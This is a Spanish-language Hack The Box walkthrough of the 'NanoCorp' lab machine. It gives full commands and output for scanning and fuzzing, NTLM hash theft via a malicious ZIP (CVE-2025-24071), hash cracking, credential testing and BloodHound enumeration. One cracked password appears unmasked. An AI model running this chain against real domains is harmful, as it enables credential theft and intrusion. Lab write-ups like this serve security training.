---
title: "NanoCorp - Hack The Box"
date: 2025-11-14
draft: false
slug: "htb-writeup-nanocorp"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos, nos dirigimos a analizar la página web activa en el puerto 80, en donde encontramos una página que nos lleva a un subdominio que nos permite subir archivos comprimidos ZIP, 7Z y RAR. Investigando un poco, encontramos una vulnerabilidad que nos permite cargar un archivo ZIP malicioso que nos ayuda a capturar el Hash NTLMv2 del usuario que ejecuta la página web, siendo el CVE-2025-24071 y CVE-2025-24054. Gracias a esta vulnerabilidad obtenemos la contraseña y un usuario válido, con lo que logramos enumerar el AD con python-bloodhound y BloodHound. Después de enumerar el AD, descubrimos que nuestro usuario se puede agregar un grupo que, dicho grupo, permite cambiarle la contraseña a un usuario sin restricciones. Aplicamos esta cadena de ataques para lograr apoderarnos de un usuario con el que nos autenticamos en la máquina AD. Dentro, utilizamos winPEASx64 para encontrar una forma de escalar privilegios, siendo así que descubrimos el uso de Check_MK Windows Agent, el cual es vulnerable a inyección de comandos (CVE-2024-0670), lo que nos permite inyectar un script de PowerShell que nos ayuda a obtener una Reverse Shell del Administrador, logrando escalar privilegios."
categories: ["HackTheBox", "Hard Machine"]
tags: ["Windows", "Active Directory", "Web Enumeration", "Fuzzing", "Fuzzing Subdomains", "NTLM Hash Disclosure (Spoofing)", "CVE-2025-24054", "CVE-2025-24071", "Cracking Hash", "Cracking NTLMv2 Hash", "BloodHound and Python-BloodHound Enumeration", "Abusing AddSelf Permission", "Abusing ForceChangePassword Permission", "Privesc - Abusing Check_MK Windows Agent (versión 2.1.0p10)", "Privesc - CVE-2024-0670", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "Wappalizer"
  - "echo"
  - "ffuf"
  - "gobuster"
  - "wget"
  - "python"
  - "responder"
  - "JohnTheRipper"
  - "netexec (nxc)"
  - "ntpdate"
  - "impacket-getTGT"
  - "klist"
  - "export"
  - "bloodhound-python"
  - "BloodHoundV4.3.1"
  - "bloodyAD"
  - "git"
  - "python3"
  - "winPEASx64.exe"
  - "nc.exe"
  - "RunasCs.exe"
  - "locate"
  - "rlwrap"
  - "nc"
links:
  - "https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/"
  - "https://www.exploit-db.com/exploits/52280"
  - "https://cti.monster/blog/2025/03/18/CVE-2025-24071.html"
  - "https://github.com/0x6rss/CVE-2025-24071_PoC"
  - "https://www.thehacker.recipes/ad/movement/dacl/addmember"
  - "https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"
  - "https://github.com/ozelis/winrmexec.git"
  - "https://github.com/peass-ng/PEASS-ng"
  - "https://pentest-tools.com/vulnerabilities-exploits/checkmk-210p40-22x-220p23-23x-230b1-24x-240b1-privilege-escalation-vulnerability_22572"
  - "https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/"
  - "https://github.com/antonioCoco/RunasCs"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-nanocorp/nanocorp.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.93
PING 10.10.11.93 (10.10.11.93) 56(84) bytes of data.
64 bytes from 10.10.11.93: icmp_seq=1 ttl=127 time=103 ms
64 bytes from 10.10.11.93: icmp_seq=2 ttl=127 time=71.1 ms
64 bytes from 10.10.11.93: icmp_seq=3 ttl=127 time=72.0 ms
64 bytes from 10.10.11.93: icmp_seq=4 ttl=127 time=71.6 ms

--- 10.10.11.93 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 71.054/79.285/102.530/13.424 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.93 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-14 22:57 CST
Initiating SYN Stealth Scan at 22:57
Scanning 10.10.11.93 [65535 ports]
Discovered open port 139/tcp on 10.10.11.93
Discovered open port 53/tcp on 10.10.11.93
Discovered open port 135/tcp on 10.10.11.93
Discovered open port 80/tcp on 10.10.11.93
Discovered open port 445/tcp on 10.10.11.93
Discovered open port 57330/tcp on 10.10.11.93
Discovered open port 3269/tcp on 10.10.11.93
Discovered open port 49669/tcp on 10.10.11.93
Discovered open port 3268/tcp on 10.10.11.93
Discovered open port 57347/tcp on 10.10.11.93
SYN Stealth Scan Timing: About 46.88% done; ETC: 22:58 (0:00:35 remaining)
Increasing send delay for 10.10.11.93 from 0 to 5 due to 11 out of 30 dropped probes since last increase.
Discovered open port 57364/tcp on 10.10.11.93
Discovered open port 49664/tcp on 10.10.11.93
Discovered open port 9389/tcp on 10.10.11.93
Increasing send delay for 10.10.11.93 from 5 to 10 due to max_successful_tryno increase to 4
Discovered open port 88/tcp on 10.10.11.93
Discovered open port 57364/tcp on 10.10.11.93
Discovered open port 593/tcp on 10.10.11.93
Increasing send delay for 10.10.11.93 from 10 to 20 due to max_successful_tryno increase to 5
Discovered open port 5986/tcp on 10.10.11.93
Increasing send delay for 10.10.11.93 from 20 to 40 due to max_successful_tryno increase to 6
SYN Stealth Scan Timing: About 63.64% done; ETC: 22:59 (0:00:38 remaining)
Discovered open port 464/tcp on 10.10.11.93
Discovered open port 636/tcp on 10.10.11.93
Discovered open port 389/tcp on 10.10.11.93
Increasing send delay for 10.10.11.93 from 40 to 80 due to 11 out of 30 dropped probes since last increase.
Completed SYN Stealth Scan at 22:59, 107.39s elapsed (65535 total ports)
Nmap scan report for 10.10.11.93
Host is up, received user-set (0.34s latency).
Scanned at 2025-11-14 22:57:36 CST for 107s
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
57330/tcp open  unknown          syn-ack ttl 127
57347/tcp open  unknown          syn-ack ttl 127
57364/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 107.52 seconds
           Raw packets sent: 524259 (23.067MB) | Rcvd: 113 (4.972KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Son bastantes puertos y podemos ver algunos que ya son conocidos, siendo un indicativo de que estamos contra una máquina **AD**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49664,49669,57330,57347,57364 10.10.11.93 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-14 22:59 CST
Nmap scan report for 10.10.11.93
Host is up (0.075s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)

|_http-title: Did not follow redirect to http://nanocorp.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-11-15 12:00:06Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
|_ssl-date: TLS randomness does not represent time
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  msrpc             Microsoft Windows RPC
49669/tcp open  msrpc             Microsoft Windows RPC
57330/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
57347/tcp open  msrpc             Microsoft Windows RPC
57364/tcp open  msrpc             Microsoft Windows RPC
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2025-11-15T12:00:59
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.44 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Bien, podemos ver bastante información con este escaneo:
* Existe una página web activa en el **puerto 80** que nos redirecciona a un dominio llamado **nanocorp.htb**.
* Se está utilizando el servicio **WinRM** en el **puerto 5986**, donde se utiliza un **certificado SSL** para la autenticación y nos muestra el dominio del **DC**, que es **dc01.nanocorp.htb**.
* El servicio **SMB** requiere credenciales válidas para listar sus recursos compartidos.

Antes que nada, vamos a registrar el dominio de la página web y el dominio del **DC** en el archivo `/etc/hosts`:
```bash
echo "10.10.11.93 nanocorp.htb dc01.nanocorp.htb" >> /etc/hosts
```
Bien, empezaremos a analizar la página web primero y de ahí seguiremos con otros servicios.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-nanocorp/Captura1.png">
</p>

Parece ser una página web de una empresa corporativa.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-nanocorp/Captura2.png">
</p>

Hay varias tecnologías, pero me llama la atención el uso de **PHP** y de **Apache2**, siendo más usados en **Linux** que en **Windows**.

Revisando qué más nos encontramos en la página, vemos que en la sección **About Us** tenemos la opción de aplicar a las vacantes de la empresa:

<p align="center">
<img src="/assets/images/htb-writeup-nanocorp/Captura3.png">
</p>

Si le damos al botón **Apply Now**, nos lleva a un subdominio donde podemos dar nuestra información de contacto y nos permiten subir nuestro CV en un **archivo ZIP**:

<p align="center">
<img src="/assets/images/htb-writeup-nanocorp/Captura4.png">
</p>

Si cargamos un archivo random, nos dará un error y nos indicará qué archivos sí acepta:

<p align="center">
<img src="/assets/images/htb-writeup-nanocorp/Captura5.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-nanocorp/Captura6.png">
</p>

Acepta archivos comprimidos tipo **ZIP, 7Z y RAR**.

Es todo lo que podemos encontrar de momento.

Me da la impresión de que podemos encontrar algo más si aplicamos **Fuzzing**, así que vamos a probarlo.

### Fuzzing {#fuzz}

Aplicaremos **Fuzzing** a la página principal, al subdominio y probaremos si existe algún otro subdominio.

#### Aplicando Fuzzing a Página Principal {#fuzz80}

Primero utilicemos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://nanocorp.htb/FUZZ -t 300 -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nanocorp.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

img                     [Status: 301, Size: 334, Words: 22, Lines: 10, Duration: 635ms]
css                     [Status: 301, Size: 334, Words: 22, Lines: 10, Duration: 173ms]
js                      [Status: 301, Size: 333, Words: 22, Lines: 10, Duration: 176ms]
IMG                     [Status: 301, Size: 334, Words: 22, Lines: 10, Duration: 149ms]
CSS                     [Status: 301, Size: 334, Words: 22, Lines: 10, Duration: 164ms]
Img                     [Status: 301, Size: 334, Words: 22, Lines: 10, Duration: 115ms]
JS                      [Status: 301, Size: 333, Words: 22, Lines: 10, Duration: 175ms]
                        [Status: 200, Size: 16212, Words: 8804, Lines: 229, Duration: 226ms]
slick                   [Status: 301, Size: 336, Words: 22, Lines: 10, Duration: 454ms]
:: Progress: [220545/220545] :: Job [1/1] :: 99 req/sec :: Duration: [0:11:05] :: Errors: 1945 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-fc*      | Para filtrar respuestas en base al código de estado. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://nanocorp.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nanocorp.htb
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 334] [--> http://nanocorp.htb/img/]
/css                  (Status: 301) [Size: 334] [--> http://nanocorp.htb/css/]
/js                   (Status: 301) [Size: 333] [--> http://nanocorp.htb/js/]
/licenses             (Status: 403) [Size: 420]
/IMG                  (Status: 301) [Size: 334] [--> http://nanocorp.htb/IMG/]
/*checkout*           (Status: 403) [Size: 301]
/CSS                  (Status: 301) [Size: 334] [--> http://nanocorp.htb/CSS/]
/Img                  (Status: 301) [Size: 334] [--> http://nanocorp.htb/Img/]
/JS                   (Status: 301) [Size: 333] [--> http://nanocorp.htb/JS/]
/phpmyadmin           (Status: 403) [Size: 301]
/webalizer            (Status: 403) [Size: 301]
/*docroot*            (Status: 403) [Size: 301]
/con                  (Status: 403) [Size: 301]
/slick                (Status: 301) [Size: 336] [--> http://nanocorp.htb/slick/]
/server-status        (Status: 403) [Size: 420]
Progress: 220544 / 220544 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Descubrimos algunas páginas, pero al momento de visitarlas, no encontramos algo que nos sea de utilidad.

Se detectan algunos falsos positivos, como la página **phpmyadmin**, pero no sirven de nada.

#### Aplicando Fuzzing al Subdominio para Identificar Archivos y Directorios Ocultos {#fuzzHire}

Enfoquemos el **Fuzzing** en buscar archivos específicos:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://hire.nanocorp.htb/FUZZ -t 300 -e .php,.txt,.html -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hire.nanocorp.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

index.html              [Status: 200, Size: 2520, Words: 646, Lines: 68, Duration: 413ms]
images                  [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 413ms]
Images                  [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 569ms]
assets                  [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 207ms]
upload.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 995ms]
Index.html              [Status: 200, Size: 2520, Words: 646, Lines: 68, Duration: 302ms]
success.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 430ms]
IMAGES                  [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 531ms]
Assets                  [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 353ms]
INDEX.html              [Status: 200, Size: 2520, Words: 646, Lines: 68, Duration: 512ms]
Upload.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 154ms]
                        [Status: 200, Size: 2520, Words: 646, Lines: 68, Duration: 468ms]
Success.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 497ms]
:: Progress: [882180/882180] :: Job [1/1] :: 197 req/sec :: Duration: [0:47:48] :: Errors: 9102 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*       | Para indicar que busque archivos especificos. |
| *-fc*      | Para filtrar respuestas en base al código de estado. |

Ahora con **gobuster**:
```bash
gobuster dir -u http://hire.nanocorp.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 -x php,html,txt -b 403,404 --ne
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hire.nanocorp.htb
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 347] [--> http://hire.nanocorp.htb/images/]
/index.html           (Status: 200) [Size: 2520]
/Images               (Status: 301) [Size: 347] [--> http://hire.nanocorp.htb/Images/]
/assets               (Status: 301) [Size: 347] [--> http://hire.nanocorp.htb/assets/]
/upload.php           (Status: 200) [Size: 0]
/Index.html           (Status: 200) [Size: 2520]
/success.php          (Status: 302) [Size: 0] [--> index.html]
/examples             (Status: 503) [Size: 406]
/IMAGES               (Status: 301) [Size: 347] [--> http://hire.nanocorp.htb/IMAGES/]
/Assets               (Status: 301) [Size: 347] [--> http://hire.nanocorp.htb/Assets/]
/INDEX.html           (Status: 200) [Size: 2520]
/Upload.php           (Status: 200) [Size: 0]
/Success.php          (Status: 302) [Size: 0] [--> index.html]
Progress: 882176 / 882176 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar que busque archivos especificos. |
| *-b*       | Para aplicar un filtro que no muestre un código de estado en específico. |
| *--ne*     | Para indicar que no muestre errores en el resultado. |

Obtuvimos varios resultados, pero al visitar las páginas de **PHP**, vemos solamente una página en blanco.

No podemos ver directamente estas páginas ni su código fuente.

#### Aplicando Fuzzing para Descubrir Subdominios {#fuzzSub}

Como vimos que existe un subdominio, puede que existan más. 

Entonces, usemos **ffuf** para comprobar si existen más subdominios:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://nanocorp.htb -H 'Host: FUZZ.nanocorp.htb' -t 300 -fw 22

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nanocorp.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.nanocorp.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 22
________________________________________________

hire                    [Status: 200, Size: 2520, Words: 646, Lines: 68, Duration: 146ms]
:: Progress: [220545/220545] :: Job [1/1] :: 142 req/sec :: Duration: [0:08:48] :: Errors: 972 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-H*       | Para utilizar una cabecera específica. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-fw*      | Para filtrar respuestas a traves de la cantidad de palabras. |

Solamente existe un subdominio, no hay más.

Por ahora, podemos enfocarnos en investigar qué vulnerabilidades podríamos aplicar en una página web que acepta **archivos ZIP** y está dentro de un servidor de **Windows**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando NTLM Hash Disclosure Via Spoofing (CVE-2025-24054 - CVE-2025-24071) {#Spoofing}

Después de una larga investigación, descubrimos que es posible capturar el **Hash NTLM** utilizando un **archivo ZIP** malicioso que se aprovecha del formato **Windows Library** (**.library-ms**).

Esta vulnerabilidad se relaciona con el **CVE-2025-24054 y CVE-2025-24071**, que realmente son la misma vulnerabilidad.

Aquí te dejo un par de blogs que te ayudarán a entender y a aplicar la vulnerabilidad:
* <a href="https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/" target="_blank">CVE-2025-24054, NTLM Exploit in the Wild</a>
* <a href="https://cti.monster/blog/2025/03/18/CVE-2025-24071.html" target="_blank">CVE-2025-24071: NTLM Hash Leak via RAR/ZIP Extraction and .library-ms File</a>

Además, tenemos automatizada esta vulnerabilidad en un repositorio de **GitHub**:
* <a href="https://github.com/0x6rss/CVE-2025-24071_PoC" taregt="_blank">Repositorio de 0x6rss: CVE-2025-24071_PoC</a>

Solamente ocuparemos el script de **Python**, así que lo descargamos con **wget**:
```bash
wget https://raw.githubusercontent.com/0x6rss/CVE-2025-24071_PoC/refs/heads/main/poc.py
```

Ejecútalo:
```bash
python poc.py
Enter your file name: exploit
Enter IP (EX: 192.168.1.162): Tu_IP
completed
```
Esto generó un **archivo ZIP** con el nombre que elegiste.

Para capturar el **Hash NTLM**, utilizaremos la herramienta **responder**:
```bash
responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.

  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
```

Ahora carga el **archivo ZIP** malicioso al subdominio:

<p align="center">
<img src="/assets/images/htb-writeup-nanocorp/Captura7.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-nanocorp/Captura8.png">
</p>

Espera un poco y observa el **responder**:
```bash
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.93
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:6d
```
Capturamos el Hash.

Guárdalo en un archivo y crackealo con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**********   (web_svc)     
1g 0:00:00:00 DONE (2025-11-14 23:43) 1.265g/s 2348Kp/s 2348Kc/s 2348KC/s doglover94..djcward
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña y vemos que le pertenece al **usuario web_svc**.

Probando en qué servicios funciona, descubrimos que funciona para **LDAP, SMB y WMI**:
```bash
nxc ldap 10.10.11.93 -u 'web_svc' -p '**********'
LDAP        10.10.11.93     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:nanocorp.htb)
LDAP        10.10.11.93     389    DC01             [+] nanocorp.htb\web_svc:**********

nxc smb 10.10.11.93 -u 'web_svc' -p '**********'
SMB         10.10.11.93     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.93     445    DC01             [+] nanocorp.htb\web_svc:**********

nxc wmi 10.10.11.93 -u 'web_svc' -p '**********'
RPC         10.10.11.93     135    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:nanocorp.htb)
RPC         10.10.11.93     135    DC01             [+] nanocorp.htb\web_svc:**********
```
Aunque el que nos ayudará más, será el **servicio LDAP**, pues con este enumeraremos el **AD** usando **BloodHound**.

### Enumeración de Active Directory con bloodhound-python y BloodHound {#BloodHound}

Te diría que utilizáramos directamente **bloodhound-python** para comenzar a capturar la información del **AD**, pero debido al uso de **SSL** y súmale **Kerberos**, puede que tengamos problemas con la captura de la información.

Así que primero crearemos un **TGT** del **usuario web_svc** y luego lo usaremos para comenzar a obtener la información del **AD**.

Primero, ponte en el mismo horario de la máquina **AD**:
```bash
ntpdate -u dc01.nanocorp.htb
2025-11-15 07:55:38.404918 (-0600) +25199.193461 +/- 0.034856 dc01.nanocorp.htb 10.10.11.93 s1 no-leap
CLOCK: time stepped by 25199.193461
```

Luego, obtén el **TGT** usando la herramienta **impacket-getTGT**:
```bash
impacket-getTGT -dc-ip 10.10.11.93 'nanocorp.htb/web_svc:**********'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in web_svc.ccache
```
Lo tenemos.

Expórtalo como variable de entorno y verifica que ya esté cargado:
```bash
export KRB5CCNAME=web_svc.ccache

klist
Ticket cache: FILE:web_svc.ccache
Default principal: web_svc@NANOCORP.HTB

Valid starting     Expires            Service principal
15/11/25 07:55:47  15/11/25 17:55:47  krbtgt/NANOCORP.HTB@NANOCORP.HTB
        renew until 16/11/25 07:55:45

```

Ya con esto listo, ya podemos usar **bloodhound-python**:
```bash
bloodhound-python -u 'WEB_SVC' -p 'dksehdgh712!@#' -d nanocorp.htb -c All -o bloodhound_results.json -ns 10.10.11.93 -k
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: nanocorp.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.nanocorp.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.nanocorp.htb
INFO: Found 6 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying comput
```
Carga esta información en **BloodHound** e investiguemos si hay alguna vulnerabilidad.

Si buscamos al **usuario web_svc** y vemos los objetivos de alto valor que puede alcanzar, podremos visualizar nuestro vector/cadena de ataques:

<p align="center">
<img src="/assets/images/htb-writeup-nanocorp/Captura9.png">
</p>

Ahí mismo podemos ver lo siguiente:
* El **usuario web_svc** tiene el permiso **AddSelf** sobre el grupo **IT_SUPPORT**, lo que nos permite añadir a este usuario a este grupo, sin ninguna restricción.
